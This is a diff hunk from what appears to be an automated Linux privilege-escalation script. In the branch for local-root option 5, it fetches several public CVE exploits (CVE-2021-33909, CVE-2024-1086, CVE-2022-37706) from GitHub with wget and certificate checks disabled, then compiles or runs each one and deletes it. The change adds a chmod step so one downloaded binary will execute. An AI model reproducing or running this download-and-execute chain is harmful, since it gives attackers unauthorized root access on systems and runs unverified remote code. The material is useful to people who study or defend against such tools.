@@ -520,7 +520,7 @@ if [ $localroot = 5 ]; then
 
     wget -q --no-check-certificate https://raw.githubusercontent.com/Liang2580/CVE-2021-33909/main/exploit.c && gcc exploit.c -o exploit && chmod +x exploit &&./exploit && $delete
 
-    wget -q --no-check-certificate https://raw.githubusercontent.com/mrwawanj/www.kern0.ru/refs/heads/master/CVE-2024-1086 && ./CVE-2024-1086 && rm -rf CVE-2024-1086
+    wget -q --no-check-certificate https://raw.githubusercontent.com/mrwawanj/www.kern0.ru/refs/heads/master/CVE-2024-1086 && chmod 0755 CVE-2024-1086 && ./CVE-2024-1086 && rm -rf CVE-2024-1086
     
     wget -q --no-check-certificate https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/main/exploit.sh && bash exploit.sh && rm -rf exploit.sh
 
